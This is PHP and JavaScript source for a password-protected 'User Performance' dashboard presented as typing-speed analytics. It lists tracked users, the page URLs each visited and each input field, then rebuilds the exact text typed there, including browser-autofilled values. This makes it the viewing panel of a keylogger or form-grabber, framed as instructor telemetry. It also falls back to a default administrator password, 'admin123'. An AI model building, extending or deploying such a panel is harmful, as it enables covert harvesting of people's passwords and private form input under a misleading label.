<?php
// dashboard.php - Instructor management dashboard for analyzing user typing performance

session_start();

// Admin credentials (username and hashed password)
$adminUser = getenv('ADMIN_USER') ?: 'admin';
$adminPassHash = getenv('ADMIN_PASS_HASH') ?: '$2y$10$C/ACuHxj/.L.Ei7g9AsDBumhcgSfC20XlNcpofkqdfHMXEyZWJBna'; // Default password: admin123

$errorMsg = '';

// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION['dashboard_logged_in']);
    header('Location: dashboard.php');
    exit;
}

// Handle login submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === $adminUser && password_verify($password, $adminPassHash)) {
        $_SESSION['dashboard_logged_in'] = true;
        header('Location: dashboard.php');
        exit;
    } else {
        $errorMsg = 'Invalid username or password.';
    }
}

$isLoggedIn = !empty($_SESSION['dashboard_logged_in']);
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Performance</title>
    <style>
        :root {
            --primary: #3b82f6;
            --primary-hover: #2563eb;
            --bg: #0b0f19;
            --card-bg: #111827;
            --card-border: #1f2937;
            --text-main: #f9fafb;
            --text-muted: #9ca3af;
            --accent-green: #10b981;
            --accent-amber: #f59e0b;
            --accent-blue: #60a5fa;
            --accent-purple: #a855f7;
            --code-bg: #030712;
            --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text-main);
            line-height: 1.5;
            padding: 24px;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-bg);
            padding: 20px 28px;
            border-radius: 12px;
            border: 1px solid var(--card-border);
            margin-bottom: 24px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }

        h1 {
            font-size: 1.4rem;
            color: var(--text-main);
            font-weight: 700;
            letter-spacing: -0.025em;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 8px 16px;
            background-color: var(--primary);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            font-size: 0.875rem;
            font-weight: 500;
            transition: all 0.15s ease;
        }

        .btn:hover {
            background-color: var(--primary-hover);
        }

        .btn-outline {
            background: transparent;
            color: var(--text-muted);
            border: 1px solid var(--card-border);
        }

        .btn-outline:hover {
            background: #1f2937;
            color: var(--text-main);
        }

        .btn-sm {
            padding: 6px 12px;
            font-size: 0.8rem;
        }

        /* Login Box */
        .login-box {
            max-width: 380px;
            margin: 90px auto;
            background: var(--card-bg);
            padding: 32px;
            border-radius: 12px;
            border: 1px solid var(--card-border);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 0.85rem;
            color: var(--text-muted);
            font-weight: 500;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px 14px;
            background: var(--bg);
            border: 1px solid var(--card-border);
            color: var(--text-main);
            border-radius: 8px;
            font-size: 0.925rem;
            outline: none;
            transition: border-color 0.15s;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: var(--primary);
        }

        .error {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
            padding: 10px 14px;
            border-radius: 8px;
            margin-bottom: 18px;
            font-size: 0.85rem;
        }

        /* Navigation Breadcrumb */
        .breadcrumb {
            display: flex;
            gap: 8px;
            align-items: center;
            background: var(--card-bg);
            padding: 12px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.875rem;
            border: 1px solid var(--card-border);
        }

        .breadcrumb-item {
            color: var(--accent-blue);
            cursor: pointer;
            font-weight: 500;
        }

        .breadcrumb-item:hover {
            text-decoration: underline;
        }

        .breadcrumb-separator {
            color: var(--text-muted);
        }

        .breadcrumb-active {
            color: var(--text-muted);
        }

        /* Card Section */
        .card {
            background: var(--card-bg);
            border-radius: 12px;
            border: 1px solid var(--card-border);
            padding: 24px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
        }

        .card-title {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--card-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        /* Item Lists */
        .list-group {
            list-style: none;
        }

        .list-item {
            padding: 14px 18px;
            background: var(--bg);
            border: 1px solid var(--card-border);
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.15s ease;
        }

        .list-item:hover {
            border-color: var(--primary);
            background: #111827;
        }

        .badge {
            background: #1f2937;
            color: var(--text-muted);
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.775rem;
            font-weight: 500;
        }

        .metric-pill {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            background: #1e293b;
            border: 1px solid #334155;
            padding: 2px 8px;
            border-radius: 6px;
            font-size: 0.75rem;
            color: var(--text-main);
            font-family: var(--font-mono);
        }

        .metric-pill.highlight {
            color: var(--accent-green);
            border-color: rgba(16, 185, 129, 0.4);
            background: rgba(16, 185, 129, 0.1);
        }

        /* Field Tabs */
        .field-tabs {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 18px;
        }

        .field-tab {
            padding: 8px 16px;
            border-radius: 8px;
            background: var(--bg);
            color: var(--text-muted);
            cursor: pointer;
            font-size: 0.85rem;
            border: 1px solid var(--card-border);
            transition: all 0.15s ease;
        }

        .field-tab:hover {
            border-color: var(--primary);
            color: var(--text-main);
        }

        .field-tab.active {
            background: var(--primary);
            color: #ffffff;
            border-color: var(--primary);
        }

        /* Code & Terminal Panels */
        .terminal-box {
            background: var(--code-bg);
            border: 1px solid var(--card-border);
            border-radius: 10px;
            padding: 18px 20px;
            margin-top: 16px;
            font-family: var(--font-mono);
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.6);
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 14px;
            padding-bottom: 8px;
            border-bottom: 1px solid #1f2937;
            color: var(--text-muted);
            font-size: 0.825rem;
        }

        .reconstructed-content {
            color: var(--accent-green);
            white-space: pre-wrap;
            word-break: break-all;
            direction: ltr;
            text-align: left;
            font-size: 0.925rem;
            line-height: 1.7;
        }

        .reconstructed-field-card {
            background: #0b0f19;
            border: 1px solid #1f2937;
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 12px;
        }

        .field-metrics-bar {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 6px;
            margin-bottom: 8px;
        }

        .reconstructed-field-tag {
            color: var(--accent-blue);
            font-weight: 600;
        }

        .reconstructed-value {
            color: #f3f4f6;
            background: #111827;
            padding: 6px 12px;
            border-radius: 6px;
            border: 1px solid #1f2937;
            display: block;
            margin-top: 4px;
        }

        .keys-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 12px;
        }

        .key-badge-dark {
            display: inline-flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: #0b0f19;
            border: 1px solid #1f2937;
            border-radius: 8px;
            padding: 8px 12px;
            min-width: 46px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
            transition: transform 0.15s, border-color 0.15s;
            font-family: var(--font-mono);
        }

        .key-badge-dark:hover {
            border-color: var(--primary);
            transform: translateY(-2px);
        }

        .key-badge-dark.is-autofill {
            border-color: rgba(245, 158, 11, 0.5);
            background: rgba(245, 158, 11, 0.08);
        }

        .key-badge-dark .char {
            font-size: 1.15rem;
            font-weight: 700;
            color: var(--text-main);
        }

        .key-badge-dark.is-autofill .char {
            color: var(--accent-amber);
        }

        .key-badge-dark .meta {
            font-size: 0.675rem;
            color: var(--text-muted);
            margin-top: 4px;
        }

        .empty-state {
            text-align: center;
            color: var(--text-muted);
            padding: 32px 0;
            font-size: 0.9rem;
        }

        .loading {
            text-align: center;
            color: var(--text-muted);
            padding: 20px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>User Performance</h1>
        <?php if ($isLoggedIn): ?>
            <a href="dashboard.php?logout=1" class="btn btn-outline btn-sm">Sign Out</a>
        <?php endif; ?>
    </header>

    <?php if (!$isLoggedIn): ?>
        <div class="login-box">
            <h2 style="margin-bottom: 20px; font-size: 1.15rem; text-align: center;">Administrator Sign In</h2>
            <?php if ($errorMsg): ?>
                <div class="error"><?php echo htmlspecialchars($errorMsg); ?></div>
            <?php endif; ?>
            <form method="POST" action="dashboard.php">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" required autocomplete="off">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" name="login" class="btn" style="width: 100%;">Sign In</button>
            </form>
        </div>
    <?php else: ?>

        <!-- Navigation Breadcrumb -->
        <div class="breadcrumb" id="breadcrumb">
            <span class="breadcrumb-item" onclick="showLevel(1)">Users</span>
        </div>

        <div class="grid">

            <!-- Section 1: Users -->
            <div class="card" id="level-1-card">
                <div class="card-title">
                    <span>Users</span>
                    <button class="btn btn-outline btn-sm" onclick="loadUsers()">Refresh</button>
                </div>
                <ul class="list-group" id="users-list">
                    <li class="loading">Loading user list...</li>
                </ul>
            </div>

            <!-- Section 2: User Pages -->
            <div class="card" id="level-2-card" style="display: none;">
                <div class="card-title">
                    <span id="level-2-title">Visited Pages</span>
                    <button class="btn btn-outline btn-sm" onclick="showLevel(1)">Back to Users</button>
                </div>
                <ul class="list-group" id="pages-list">
                    <li class="loading">Loading pages...</li>
                </ul>
            </div>

            <!-- Section 3: Input Fields & Keystrokes -->
            <div class="card" id="level-3-card" style="display: none;">
                <div class="card-title">
                    <span id="level-3-title">Keystrokes & Performance Metrics</span>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-outline btn-sm" onclick="exportDataJson()">Export JSON</button>
                        <button class="btn btn-sm" id="btn-show-all-keys" onclick="selectAllFieldsKeys()">Show All Keys</button>
                        <button class="btn btn-outline btn-sm" onclick="showLevel(2)">Back to Pages</button>
                    </div>
                </div>

                <div style="margin-bottom: 12px;">
                    <strong style="font-size: 0.875rem; color: var(--text-muted);">Select Input Field:</strong>
                </div>
                <div class="field-tabs" id="field-tabs">
                    <!-- Dynamic tabs -->
                </div>

                <!-- Text Reconstruction & Performance Metrics -->
                <div class="terminal-box">
                    <div class="terminal-header">
                        <span>Reconstructed Field Values & Performance Telemetry</span>
                        <span id="reconstruction-status" class="badge">Ready</span>
                    </div>
                    <div class="reconstructed-content" id="text-reconstruction"></div>
                </div>

                <!-- Keystroke Visualizer -->
                <div class="terminal-box" style="margin-top: 20px;">
                    <div class="terminal-header">
                        <span>Exact Keystroke Sequence</span>
                        <span id="keystroke-count" class="badge">0 Keys</span>
                    </div>
                    <div class="keys-grid" id="keys-list">
                        <div class="empty-state">Select an input field or click "Show All Keys".</div>
                    </div>
                </div>
            </div>

        </div>

    <?php endif; ?>
</div>

<?php if ($isLoggedIn): ?>
<script>
    let selectedUserId = null;
    let selectedPageUrl = null;
    let selectedFieldId = 'all';
    let currentLoadedKeys = [];

    document.addEventListener('DOMContentLoaded', function() {
        loadUsers();
    });

    function showLevel(level) {
        const l1 = document.getElementById('level-1-card');
        const l2 = document.getElementById('level-2-card');
        const l3 = document.getElementById('level-3-card');
        const bc = document.getElementById('breadcrumb');

        if (level === 1) {
            l1.style.display = 'block';
            l2.style.display = 'none';
            l3.style.display = 'none';
            selectedUserId = null;
            selectedPageUrl = null;
            bc.innerHTML = `<span class="breadcrumb-item" onclick="showLevel(1)">Users</span>`;
        } else if (level === 2) {
            l1.style.display = 'none';
            l2.style.display = 'block';
            l3.style.display = 'none';
            selectedPageUrl = null;
            bc.innerHTML = `
                <span class="breadcrumb-item" onclick="showLevel(1)">Users</span>
                <span class="breadcrumb-separator">/</span>
                <span class="breadcrumb-item" onclick="showLevel(2)">user : ${escapeHtml(selectedUserId)}</span>
            `;
        } else if (level === 3) {
            l1.style.display = 'none';
            l2.style.display = 'none';
            l3.style.display = 'block';
            bc.innerHTML = `
                <span class="breadcrumb-item" onclick="showLevel(1)">Users</span>
                <span class="breadcrumb-separator">/</span>
                <span class="breadcrumb-item" onclick="showLevel(2)">user : ${escapeHtml(selectedUserId)}</span>
                <span class="breadcrumb-separator">/</span>
                <span class="breadcrumb-active">url : ${escapeHtml(selectedPageUrl)}</span>
            `;
        }
    }

    function loadUsers() {
        const container = document.getElementById('users-list');
        container.innerHTML = '<li class="loading">Loading user list...</li>';

        fetch('api.php?action=get_users')
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (data.users.length === 0) {
                        container.innerHTML = '<li class="empty-state">No users recorded yet.</li>';
                        return;
                    }
                    container.innerHTML = data.users.map(u => `
                        <li class="list-item" onclick="selectUser('${escapeJs(u)}')">
                            <span>user : <strong>${escapeHtml(u)}</strong></span>
                            <span class="badge">View Activity &rarr;</span>
                        </li>
                    `).join('');
                } else {
                    container.innerHTML = `<li class="error">Error: ${escapeHtml(data.message)}</li>`;
                }
            })
            .catch(err => {
                container.innerHTML = `<li class="error">Error connecting to server.</li>`;
            });
    }

    function selectUser(userId) {
        selectedUserId = userId;
        document.getElementById('level-2-title').innerText = `Visited Pages by user : ${userId}`;
        showLevel(2);
        loadPages(userId);
    }

    function loadPages(userId) {
        const container = document.getElementById('pages-list');
        container.innerHTML = '<li class="loading">Loading pages...</li>';

        fetch(`api.php?action=get_pages&user_id=${encodeURIComponent(userId)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (data.pages.length === 0) {
                        container.innerHTML = '<li class="empty-state">No pages recorded for this user.</li>';
                        return;
                    }
                    container.innerHTML = data.pages.map(p => `
                        <li class="list-item" onclick="selectPage('${escapeJs(p)}')">
                            <span>url : <strong>${escapeHtml(p)}</strong></span>
                            <span class="badge">View Fields &rarr;</span>
                        </li>
                    `).join('');
                } else {
                    container.innerHTML = `<li class="error">Error: ${escapeHtml(data.message)}</li>`;
                }
            })
            .catch(err => {
                container.innerHTML = `<li class="error">Error connecting to server.</li>`;
            });
    }

    function selectPage(pageUrl) {
        selectedPageUrl = pageUrl;
        document.getElementById('level-3-title').innerText = `Keystrokes & Performance on ${pageUrl}`;
        showLevel(3);
        loadFieldsAndKeys(selectedUserId, selectedPageUrl);
    }

    function loadFieldsAndKeys(userId, pageUrl) {
        const tabsContainer = document.getElementById('field-tabs');
        tabsContainer.innerHTML = '<span class="loading">Loading input fields...</span>';

        fetch(`api.php?action=get_fields&user_id=${encodeURIComponent(userId)}&page_url=${encodeURIComponent(pageUrl)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    const fields = data.fields || [];
                    let html = `<button class="field-tab active" id="tab-all" onclick="selectField('all')">All Fields</button>`;

                    fields.forEach(f => {
                        const label = f.field_name ? `${f.field_id} (${f.field_name})` : f.field_id;
                        html += `<button class="field-tab" id="tab-${escapeHtml(f.field_id)}" onclick="selectField('${escapeJs(f.field_id)}')">${escapeHtml(label)} <span class="badge">${f.key_count}</span></button>`;
                    });

                    tabsContainer.innerHTML = html;
                    selectField('all');
                } else {
                    tabsContainer.innerHTML = `<span class="error">Error loading fields</span>`;
                }
            });
    }

    function selectField(fieldId) {
        selectedFieldId = fieldId;

        document.querySelectorAll('.field-tab').forEach(t => t.classList.remove('active'));
        const activeTab = document.getElementById(`tab-${fieldId}`) || document.getElementById('tab-all');
        if (activeTab) activeTab.classList.add('active');

        loadKeys(selectedUserId, selectedPageUrl, fieldId);
    }

    function selectAllFieldsKeys() {
        selectField('all');
    }

    function loadKeys(userId, pageUrl, fieldId) {
        const keysContainer = document.getElementById('keys-list');
        const textPreview = document.getElementById('text-reconstruction');
        const countBadge = document.getElementById('keystroke-count');

        keysContainer.innerHTML = '<div class="loading">Fetching keystrokes...</div>';
        textPreview.innerHTML = '<span class="loading">Processing telemetry...</span>';

        let url = `api.php?action=get_keys&user_id=${encodeURIComponent(userId)}&page_url=${encodeURIComponent(pageUrl)}`;
        if (fieldId && fieldId !== 'all') {
            url += `&field_id=${encodeURIComponent(fieldId)}`;
        }

        fetch(url)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    const keys = data.keys || [];
                    currentLoadedKeys = keys;
                    countBadge.innerText = `${keys.length} Keys`;

                    if (keys.length === 0) {
                        keysContainer.innerHTML = '<div class="empty-state">No keystrokes recorded.</div>';
                        textPreview.innerText = 'Input is empty.';
                        return;
                    }

                    // Render dark styled key badges
                    keysContainer.innerHTML = keys.map((k, index) => {
                        let displayChar = k.key_char;
                        if (displayChar === ' ') displayChar = '␣';
                        if (displayChar === 'Enter') displayChar = '↵';
                        if (displayChar === 'Backspace') displayChar = '⌫';
                        if (displayChar === 'Tab') displayChar = '⇥';

                        const isAutofill = k.key_code === 'Autofill';
                        const badgeClass = isAutofill ? 'key-badge-dark is-autofill' : 'key-badge-dark';
                        const typeLabel = isAutofill ? 'Autofill' : `#${k.sequence_order}`;

                        return `
                            <div class="${badgeClass}" title="Field: ${escapeHtml(k.field_id)} | Code: ${escapeHtml(k.key_code)} | Order: #${k.sequence_order}">
                                <span class="char">${escapeHtml(displayChar)}</span>
                                <span class="meta">${escapeHtml(typeLabel)}</span>
                            </div>
                        `;
                    }).join('');

                    // Precise text reconstruction & typing metrics per field
                    const fieldStats = {};

                    keys.forEach(k => {
                        const fId = k.field_id;
                        if (!fieldStats[fId]) {
                            fieldStats[fId] = {
                                value: '',
                                autofillActive: false,
                                minTs: k.timestamp,
                                maxTs: k.timestamp,
                                totalKeys: 0,
                                backspaces: 0
                            };
                        }

                        const stat = fieldStats[fId];
                        stat.totalKeys++;
                        if (k.timestamp < stat.minTs) stat.minTs = k.timestamp;
                        if (k.timestamp > stat.maxTs) stat.maxTs = k.timestamp;

                        if (k.key_code === 'Autofill') {
                            if (!stat.autofillActive) {
                                stat.value = '';
                                stat.autofillActive = true;
                            }
                            stat.value += k.key_char;
                        } else {
                            stat.autofillActive = false;
                            if (k.key_char === 'Backspace') {
                                stat.backspaces++;
                                stat.value = stat.value.slice(0, -1);
                            } else if (k.key_char === 'Enter') {
                                stat.value += '\n';
                            } else if (k.key_char === 'Tab') {
                                stat.value += '\t';
                            } else if (k.key_char && k.key_char.length === 1) {
                                stat.value += k.key_char;
                            }
                        }
                    });

                    let reconstructionHtml = '';
                    for (const [fId, stat] of Object.entries(fieldStats)) {
                        const durationSec = Math.max(0.1, (stat.maxTs - stat.minTs) / 1000);
                        const chars = stat.value.length;
                        const wpm = Math.round((chars / 5) / (durationSec / 60)) || 0;
                        const accuracy = Math.max(0, Math.round(((stat.totalKeys - stat.backspaces) / Math.max(1, stat.totalKeys)) * 100));

                        reconstructionHtml += `
                            <div class="reconstructed-field-card">
                                <span class="reconstructed-field-tag">[${escapeHtml(fId)}]:</span>
                                <div class="field-metrics-bar">
                                    <span class="metric-pill highlight">Speed: ${wpm} WPM</span>
                                    <span class="metric-pill">Accuracy: ${accuracy}%</span>
                                    <span class="metric-pill">Time: ${durationSec.toFixed(1)}s</span>
                                    <span class="metric-pill">Keys: ${stat.totalKeys}</span>
                                    ${stat.backspaces > 0 ? `<span class="metric-pill" style="color:#fca5a5;">Fixes: ${stat.backspaces}</span>` : ''}
                                </div>
                                <span class="reconstructed-value">${escapeHtml(stat.value || '(empty)')}</span>
                            </div>
                        `;
                    }

                    textPreview.innerHTML = reconstructionHtml || 'Input is empty.';
                } else {
                    keysContainer.innerHTML = `<div class="error">Error: ${escapeHtml(data.message)}</div>`;
                }
            })
            .catch(err => {
                keysContainer.innerHTML = `<div class="error">Error connecting to server.</div>`;
            });
    }

    function exportDataJson() {
        if (!currentLoadedKeys || currentLoadedKeys.length === 0) {
            alert('No data to export.');
            return;
        }

        const report = {
            user_id: selectedUserId,
            page_url: selectedPageUrl,
            field_filter: selectedFieldId,
            exported_at: new Date().toISOString(),
            total_keystrokes: currentLoadedKeys.length,
            keystrokes: currentLoadedKeys
        };

        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `performance_${selectedUserId || 'user'}_${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    function escapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    function escapeJs(str) {
        if (!str) return '';
        return String(str).replace(/'/g, "\\'").replace(/"/g, '\\"');
    }
</script>
<?php endif; ?>

</body>
</html>
